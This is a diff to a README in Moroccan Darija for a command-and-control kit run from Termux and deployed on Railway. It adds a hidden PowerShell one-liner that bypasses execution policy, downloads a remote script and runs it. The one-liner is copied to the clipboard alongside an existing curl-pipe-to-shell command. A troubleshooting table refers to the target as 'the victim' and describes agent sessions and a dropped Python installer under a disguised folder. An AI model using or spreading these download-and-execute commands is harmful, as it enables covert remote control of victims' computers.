@@ -50,7 +50,7 @@ Kay3tik l'joj one-liners wajdin. Copy l'wa7ed li bghit:
 ### B yeddek (nafs l'natija)
 
     echo "curl -fsSL $URL/i | sh" | termux-clipboard-set
-    echo "powershell -w hidden -c \"irm $URL/i.ps1 | iex\"" | termux-clipboard-set
+    echo "powershell -NoProfile -ExecutionPolicy Bypass -w hidden -c \"irm $URL/i.ps1 | iex\"" | termux-clipboard-set
 
 ### L'panel kaydirha lik
 
@@ -126,6 +126,7 @@ Rje3: `tmux a -t c2`.
 | `healthz` 404 | deploy tqte3 / port ghalet | `railway up`, chouf Logs |
 | `401` | key ghalta | 3awd `railway variables`, `source ~/.c2` |
 | session ma katbanch | `python3` makaynch 3la l'dda7ya | goul lih `pkg install python` |
+| session d Windows ma katbanch | `WindowsApps\python.exe` stub | l'installer kaytnzzel embed python w kay-verifih; chouf `%LOCALAPPDATA%\svc\boot.log` |
 | session katgoul `-` | agent tqte3 > 90s | kayrje3 bouhdo f 30s |
 | `nohup` kaymchi | Android kill | battery unrestricted + wake-lock |
 | `termux-open-url` ma kaydirch walou | makaynch browser | `pkg install x11-repo` wla 7el Chrome b yeddek |
